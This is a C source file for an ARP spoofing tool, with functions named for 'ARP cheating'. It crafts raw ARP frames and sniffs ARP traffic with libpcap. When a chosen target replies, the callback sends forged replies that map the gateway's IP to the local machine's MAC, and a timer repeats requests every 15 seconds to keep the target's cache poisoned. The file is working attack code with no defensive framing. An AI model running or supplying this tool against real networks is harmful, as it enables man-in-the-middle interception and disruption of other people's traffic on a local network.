#include "socket_arp.h"
#include <timer.h>

/*************************************************************
**********  Function Declaration Of ARP Cheating  ************
**************************************************************/
/**
 * @brief arp_request_package 
 *
 * @param frame
 * @param src_ip[4]
 * @param src_mac[6]
 * @param dst_ip[4]
 */
void arp_request_package(struct frame_arp *frame, unsigned char src_ip[4], 
                    unsigned char src_mac[6], unsigned char dst_ip[4])
{
    unsigned char broad_mac[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
    
    memcpy(frame->fh.dst_mac, broad_mac, 6);
    memcpy(frame->fh.src_mac, src_mac, 6);
    frame->fh.proto_type = htons(ETH_P_ARP);
    frame->ah.ar_hrd = htons(ARPHRD_ETHER);
    frame->ah.ar_pro = htons(ETH_P_IP);
    frame->ah.ar_hln = 6;
    frame->ah.ar_pln = 4;
    frame->ah.ar_op = htons(ARPOP_REQUEST);
    memcpy(frame->src_mac, src_mac, 6);
    memcpy(frame->src_ip, src_ip, 4);
    //memset(frame->dst_mac, 0, 6);
    memcpy(frame->dst_ip, dst_ip, 4); 
}

/**
 * @brief arp_reply_package 
 *
 * @param frame
 * @param src_ip[4]
 * @param src_mac[6]
 * @param dst_ip[4]
 * @param dst_mac[6]
 */
void arp_reply_package(struct frame_arp *frame, unsigned char src_ip[4], 
                    unsigned char src_mac[6], unsigned char dst_ip[4], unsigned char dst_mac[6])
{  
    memcpy(frame->fh.dst_mac, dst_mac, 6);
    memcpy(frame->fh.src_mac, src_mac, 6);
    frame->fh.proto_type = htons(ETH_P_ARP);
    frame->ah.ar_hrd = htons(ARPHRD_ETHER);
    frame->ah.ar_pro = htons(ETH_P_IP);
    frame->ah.ar_hln = 6;
    frame->ah.ar_pln = 4;
    frame->ah.ar_op = htons(ARPOP_REPLY);
    memcpy(frame->src_mac, src_mac, 6);
    memcpy(frame->src_ip, src_ip, 4);
    memcpy(frame->dst_mac, dst_mac, 6);
    memcpy(frame->dst_ip, dst_ip, 4); 
}

/**
 * @brief arp_request_send 
 *
 * @param fd
 * @param addr
 * @param dst_ip[4]
 * @param src_ip[4]
 * @param src_mac[6]
 *
 * @return send count, if succ; -1, if failed 
 */
int arp_request_send(int fd, struct sockaddr *addr, unsigned char dst_ip[4], 
             unsigned char src_ip[4], unsigned char src_mac[6])
{
    struct frame_arp frame;
    
    memset(&frame, 0, sizeof(frame));
    arp_request_package(&frame, src_ip, src_mac, dst_ip);
    sendto(fd, &frame, sizeof(frame), 0, addr, sizeof(struct sockaddr_ll));
    
    return fd;
}

/**
 * @brief arp_reply_send 
 *
 * @param fd
 * @param addr
 * @param dst_ip[4]
 * @param dst_mac[6]
 * @param src_ip[4]
 * @param src_mac[6]
 *
 * @return send count, if succ; -1, if failed 
 */
int arp_reply_send(int fd, struct sockaddr *addr, unsigned char dst_ip[4], unsigned char dst_mac[6], 
             unsigned char src_ip[4], unsigned char src_mac[6])
{
    struct frame_arp frame;
    int rt = 0;
    
    memset(&frame, 0, sizeof(frame));
    arp_reply_package(&frame, src_ip, src_mac, dst_ip, dst_mac);
    rt = sendto(fd, &frame, sizeof(frame), 0, addr, sizeof(struct sockaddr_ll));
    
    return rt;
}

static void callback(unsigned char *arg, const struct pcap_pkthdr *head, 
        const unsigned char *packet)
{
    struct frame_arp *old_frame = (struct frame_arp *)packet;
    struct frame_arp frame;
	struct pcap_info *info = (struct pcap_info *)arg;
    int ar_op = -1;
    char ip_buf[128] = {0};

    memcpy(&frame, packet, sizeof(frame));
    ar_op = ntohs(frame.ah.ar_op);

    // ------------------------------------arp frame info-------------------------------------------------------
    if(ar_op == 1) printf("arp request\t");
    if(ar_op == 2) printf("arp reply \t");
    inet_ntop(AF_INET, &old_frame->src_ip, ip_buf, sizeof(ip_buf));
    printf("[%02x:%02x:%02x:%02x:%02x:%02x](%s)", old_frame->src_mac[0],old_frame->src_mac[1],old_frame->src_mac[2],
            old_frame->src_mac[3],old_frame->src_mac[4],old_frame->src_mac[5], ip_buf);
    printf("\t->\t");
    memset(ip_buf, 0, sizeof(ip_buf));
    inet_ntop(AF_INET, &old_frame->dst_ip, ip_buf, sizeof(ip_buf));
    printf("[%02x:%02x:%02x:%02x:%02x:%02x](%s)", old_frame->dst_mac[0], old_frame->dst_mac[1], 
            old_frame->dst_mac[2], old_frame->dst_mac[3], old_frame->dst_mac[4], 
            old_frame->dst_mac[5], ip_buf);
    printf("\n");

    // ---------------------------------------------------------------------------------------------
    if(ar_op == ARPOP_REPLY && (old_frame->src_ip)[3] == info->attack_ip[3] && (old_frame->dst_ip)[3] == info->local_ip[3]) {
        //send faked arp reply frame
        arp_reply_send(info->fd, (struct sockaddr*)&info->addr, info->attack_ip, old_frame->src_mac, 
                        info->gateway_ip, info->local_mac);
        printf("\033[0;35msuccess faked %d.%d.%d.%d\n\033[0m", 
                (old_frame->src_ip)[0], (old_frame->src_ip)[1],
                (old_frame->src_ip)[2], (old_frame->src_ip)[3]);
    }

    if((ar_op == ARPOP_REQUEST && (old_frame->src_ip)[3] == info->gateway_ip[3]) ||
            (ar_op == ARPOP_REQUEST && (old_frame->src_ip)[3] == info->attack_ip[3] && (old_frame->dst_ip)[3] == info->gateway_ip[3]))
    {
        sleep(1);
        arp_request_send(info->fd, (struct sockaddr *)&info->addr, info->attack_ip, info->local_ip, info->local_mac);
        printf("\033[0;32msuccess send arp request to %d.%d.%d.%d\n\033[0m", info->attack_ip[0], 
            info->attack_ip[1], info->attack_ip[2], info->attack_ip[3]);
    }

}

/**
 * @brief pcap_listen 
 *
 * @param arg
 *
 * @return 
 */
void* pcap_listen(void *arg)
{
    char errbuf[1024] = {0};
    unsigned int net, mask;
    struct bpf_program fp;
    
    if (arg == NULL) return NULL;
    pcap_t *handle = pcap_open_live(((struct pcap_info *)arg)->ifname, 
            2048, 1, 1000, errbuf);
    if(handle == NULL) {
		printf("pcap_open_live():%s\n", errbuf);
		exit(1);
	}
	
    if(pcap_lookupnet(((struct pcap_info *)arg)->ifname, &net, &mask, errbuf) == -1) 
        printf("pcap_lookupnet():%s\n", errbuf);
    if(pcap_compile(handle, &fp, ((struct pcap_info *)arg)->proto, 0, net) == -1) 
        printf("pcap_compile():%s\n", errbuf);
    if(pcap_setfilter(handle, &fp) == -1) 
        printf("pcap_setfilter():%s\n", errbuf);
    while(pcap_loop(handle, -1, ((struct pcap_info *)arg)->cb, arg) != -1);

    return NULL;
}

void timer_to_arp_send(void *arg)
{
    struct pcap_info *info = (struct pcap_info *)arg;
    arp_request_send(info->fd, (struct sockaddr *)&info->addr, info->attack_ip, info->local_ip, info->local_mac);
    printf("\033[0;32msuccess send arp request to %d.%d.%d.%d\n\033[0m", info->attack_ip[0], 
            info->attack_ip[1], info->attack_ip[2], info->attack_ip[3]);
}

/**
 * @brief arp_cheat 
 *
 * @param ifname     [in] interface name
 * @param attack_ip  [in] ip address of attacking
 * @param gateway_ip [in] ip address of gateway
 *
 * @return 0, if succ; -1, if failed
 */
int arp_cheat(const char *iifname, const char *iattack_ip, 
        const char *igateway_ip)
{
    pthread_t pid; 
    struct ifreq req;
    struct pcap_info info = {0};
    struct timer *tm = NULL;
    char ip[20] = {0};
    char ifname[64] = {0};
    char gateway[20] = {0};
    char *ifname_save = (char *)iifname;
    char *gw_save = gateway;

    /**
     * check ifname
     */
    if (iattack_ip == NULL) return -1;
    if (iifname ==  NULL || !strlen(iifname)) {
        get_ifname(ifname);
        ifname_save = strtok(ifname, " ");
    }
    if (ifname_save == NULL) return -1;

    /**
     * check gateway
     */
    if (igateway_ip == NULL || !strlen(igateway_ip)) {
        get_gateway(gw_save, ifname_save);
    }
    if (!strlen(gw_save)) return -1;
    if (!inet_aton(gw_save, &info.addr.in_addr)) {
        fprintf(stderr, "invalid gateway address %s\n", gw_save);
        exit(1);
    }

    if ((info.fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) < 0) {
        perror("socket()");
        exit(1);
    }

    info.addr.addr_ll.sll_family = AF_PACKET;
    memset(&req, 0, sizeof(req));
    strcpy(req.ifr_name, ifname_save);
    xioctl(info.fd, SIOCGIFINDEX, (char *)&req, "ioctl() SIOCGIFINDEX");
    /*if (ioctl(info.fd, SIOCGIFINDEX, &req) != 0) {
        perror("ioctl()");
        exit(1);
    }*/
    info.addr.addr_ll.sll_ifindex = req.ifr_ifindex;
    info.addr.addr_ll.sll_protocol = htons(ETH_P_ARP);
    
    /**
     * check etherface ARPable
     */
    //ioctl(info.fd, SIOCGIFFLAGS, (char *)&req);
    xioctl(info.fd, SIOCGIFFLAGS, (char *)&req, "ioctl() SIOCGIFFLAGS");
    if (!(req.ifr_flags & IFF_UP)) {
        fprintf(stderr, "%s is down\n", iifname);
        exit(1);
    }
    if (req.ifr_flags & (IFF_NOARP | IFF_LOOPBACK)) {
        fprintf(stderr, "%s is not ARPable\n", iifname);
        exit(1);
    }
    /**
     * packet pcap_info
     */
    info.proto = "arp";
    strcpy(info.ifname, ifname_save);
    info.cb = callback;
    ip2arr(iattack_ip, info.attack_ip);
    ip2arr(gw_save, info.gateway_ip);
    get_ip_by_ifname(ifname_save, ip);
    ip2arr(ip, info.local_ip);
    get_mac_addr(ifname_save , info.local_mac);
	
    pthread_create(&pid, NULL, pcap_listen, &info);
    arp_request_send(info.fd, (struct sockaddr *)&info.addr, info.attack_ip, info.local_ip, info.local_mac);
    printf("\033[0;32msuccess send arp request to %d.%d.%d.%d\n\033[0m", info.attack_ip[0], 
            info.attack_ip[1], info.attack_ip[2], info.attack_ip[3]);
    tm = timer_creat(15 * 1000, timer_to_arp_send, (void *)&info, 1);
    timer_start(tm);
    pthread_exit(NULL);

    return 0;
}


/**
 * @brief get_net_mac 
 *
 * @param ip     [in]  target ip address
 * @param mac[6] [out] target mac address
 *
 * @return 0, if uscc; -1, if failed
 */
/*
int get_net_mac(const char *dstip, unsigned char mac[6])
{
    int fd; 
    struct ifreq req;
    struct in_addr addr;
    struct sockaddr_ll addr_ll;
    char ip[20] = {0};
    unsigned char src_ip[4] = {0};
    unsigned char dst_ip[4] = {0};
    unsigned char src_mac[4] = {0};
    char ifname[64] = {0};
    char *ifname_save = (char *)ifname;
    char buf[1024] = {0};

    if (ip == NULL) return -1;
    get_ifname(ifname);
    ifname_save = strtok(ifname, " ");
    if (ifname_save == NULL) return -1;

    if (!inet_aton(dstip, &addr)) {
        fprintf(stderr, "invalid ip address %s\n", ip);
        exit(1);
    }

    if ((fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) < 0) {
        perror("WARNING socket()");
    }

    addr_ll.sll_family = AF_PACKET;
    memset(&req, 0, sizeof(req));
    strcpy(req.ifr_name, ifname_save);
    xioctl(fd, SIOCGIFINDEX, (char *)&req, "ioctl() SIOCGIFINDEX");
    addr_ll.sll_ifindex = req.ifr_ifindex;
    addr_ll.sll_protocol = htons(ETH_P_ARP);
    
    get_ip_by_ifname(ifname_save, ip);
    ip2arr(ip, src_ip);
    get_mac_addr(ifname_save, src_mac);
    ip2arr(dstip, dst_ip);
	
    arp_request_send(fd, (struct sockaddr *)&addr_ll, dst_ip, src_ip, src_mac);
    unsigned char from[4];
    while (1) {
        struct sockaddr_ll he;
        socklen_t len = sizeof(he);
        struct frame_hdr *fh;
        struct arp_hdr *ah;
        char *p = NULL;
        int ret = 0;
        
        ret = recvfrom(fd, buf, sizeof(buf), 0, 
                (struct sockaddr *)&he, &len);
        if (ret < 0) continue;
        fh = (struct frame_hdr *)buf;
        ah = (struct arp_hdr*)(fh + 1);
        p = (char *)(ah + 1);
        memcpy(mac, p, 6);
        p += 6;
        memcpy(from, p, 4);
        if (from[0] == dst_ip[0] && from[1] == dst_ip[1] &&
                from[2] == dst_ip[2] && from[3] == dst_ip[3])
		break;
	}

    close(fd);

    return 0;
}
*/


